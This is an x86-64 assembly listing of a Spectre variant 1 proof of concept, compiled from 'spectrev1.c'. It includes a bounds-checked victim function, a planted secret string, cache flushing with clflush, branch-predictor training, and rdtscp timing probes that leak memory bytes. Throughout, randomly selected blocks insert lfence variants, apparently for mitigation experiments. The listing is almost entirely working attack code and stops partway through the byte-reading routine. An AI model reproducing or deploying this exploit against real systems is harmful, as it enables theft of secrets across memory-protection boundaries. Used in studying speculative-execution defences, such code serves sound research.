	.file	"spectrev1.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 16
	.type	array1, @object
	.size	array1, 16
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 8
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4379:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_function_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_function_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_function_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_function_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_function_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_function_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_function_win0_var9
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	addq	$32, %rsp
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 3
.Lvictim_function_win0_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 4
.Lvictim_function_win0_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 5
.Lvictim_function_win0_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 6
.Lvictim_function_win0_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 7
.Lvictim_function_win0_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 8
.Lvictim_function_win0_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 9
.Lvictim_function_win0_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdx), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L3:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4379:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4380:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	addq	$-128, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movl	%edi, -116(%rbp)
	movq	%rsi, -128(%rbp)
	movq	%rdx, -136(%rbp)
	movq	%rcx, -144(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -108(%rbp)
	movl	$0, -96(%rbp)
	jmp	.L5
.L6:
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -96(%rbp)
.L5:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win11_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win11_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win11_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win11_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win11_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win11_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win11_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win11_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win11_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win11_var9
	jmp	.LreadMemoryByte_win11_var0
## Variant 0
.LreadMemoryByte_win11_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$255, -96(%rbp)
	jle	.L6
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 1
.LreadMemoryByte_win11_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 2
.LreadMemoryByte_win11_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 3
.LreadMemoryByte_win11_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 4
.LreadMemoryByte_win11_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 5
.LreadMemoryByte_win11_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 6
.LreadMemoryByte_win11_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 7
.LreadMemoryByte_win11_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 8
.LreadMemoryByte_win11_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 9
.LreadMemoryByte_win11_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
.LreadMemoryByte_win11_continue:
	jmp	.L7
.L27:
	movl	$0, -96(%rbp)
	jmp	.L8
.L9:
	movl	-96(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -96(%rbp)
.L8:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win10_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win10_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win10_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win10_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win10_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win10_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win10_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win10_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win10_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win10_var9
	jmp	.LreadMemoryByte_win10_var0
## Variant 0
.LreadMemoryByte_win10_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$255, -96(%rbp)
	jle	.L9
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 1
.LreadMemoryByte_win10_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 2
.LreadMemoryByte_win10_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 3
.LreadMemoryByte_win10_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 4
.LreadMemoryByte_win10_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 5
.LreadMemoryByte_win10_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 6
.LreadMemoryByte_win10_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 7
.LreadMemoryByte_win10_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 8
.LreadMemoryByte_win10_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 9
.LreadMemoryByte_win10_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
.LreadMemoryByte_win10_continue:
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, -80(%rbp)
	movl	$59, -92(%rbp)
	jmp	.L10
.L13:
	leaq	array1_size(%rip), %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -104(%rbp)
	jmp	.L11
.L12:
	movl	-104(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -104(%rbp)
.L11:
	movl	-104(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win9_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win9_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win9_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win9_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win9_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win9_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win9_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win9_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win9_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win9_var9
	jmp	.LreadMemoryByte_win9_var0
## Variant 0
.LreadMemoryByte_win9_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 1
.LreadMemoryByte_win9_var1:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 2
.LreadMemoryByte_win9_var2:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 3
.LreadMemoryByte_win9_var3:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 4
.LreadMemoryByte_win9_var4:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 5
.LreadMemoryByte_win9_var5:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 6
.LreadMemoryByte_win9_var6:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 7
.LreadMemoryByte_win9_var7:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 8
.LreadMemoryByte_win9_var8:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 9
.LreadMemoryByte_win9_var9:
	popq	%rax
	addq	$32, %rsp
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
.LreadMemoryByte_win9_continue:
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -64(%rbp)
	movq	-128(%rbp), %rax
	xorq	-80(%rbp), %rax
	andq	-64(%rbp), %rax
	xorq	-80(%rbp), %rax
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -92(%rbp)
.L10:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win8_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win8_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win8_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win8_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win8_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win8_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win8_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win8_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win8_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win8_var9
	jmp	.LreadMemoryByte_win8_var0
## Variant 0
.LreadMemoryByte_win8_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$0, -92(%rbp)
	jns	.L13
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 1
.LreadMemoryByte_win8_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 2
.LreadMemoryByte_win8_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 3
.LreadMemoryByte_win8_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 4
.LreadMemoryByte_win8_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 5
.LreadMemoryByte_win8_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 6
.LreadMemoryByte_win8_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 7
.LreadMemoryByte_win8_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 8
.LreadMemoryByte_win8_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 9
.LreadMemoryByte_win8_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
.LreadMemoryByte_win8_continue:
	jmp	.L14
.L18:
	movl	-96(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -84(%rbp)
	movl	-84(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -72(%rbp)
	leaq	-108(%rbp), %rax
	movq	%rax, -32(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-32(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-72(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%rbp)
	leaq	-108(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rbx
	movl	%ebx, %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win7_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win7_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win7_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win7_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win7_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win7_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win7_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win7_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win7_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win7_var9
	jmp	.LreadMemoryByte_win7_var0
## Variant 0
.LreadMemoryByte_win7_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, -116(%rbp)
	jl	.L17
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 1
.LreadMemoryByte_win7_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 2
.LreadMemoryByte_win7_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 3
.LreadMemoryByte_win7_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 4
.LreadMemoryByte_win7_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 5
.LreadMemoryByte_win7_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 6
.LreadMemoryByte_win7_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 7
.LreadMemoryByte_win7_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 8
.LreadMemoryByte_win7_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 9
.LreadMemoryByte_win7_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
.LreadMemoryByte_win7_continue:
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %edx
	leaq	array1(%rip), %rax
	movzbl	(%rdx,%rax), %eax
	movzbl	%al, %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win6_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win6_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win6_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win6_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win6_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win6_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win6_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win6_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win6_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win6_var9
	jmp	.LreadMemoryByte_win6_var0
## Variant 0
.LreadMemoryByte_win6_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, -84(%rbp)
	je	.L17
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 1
.LreadMemoryByte_win6_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 2
.LreadMemoryByte_win6_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 3
.LreadMemoryByte_win6_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 4
.LreadMemoryByte_win6_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
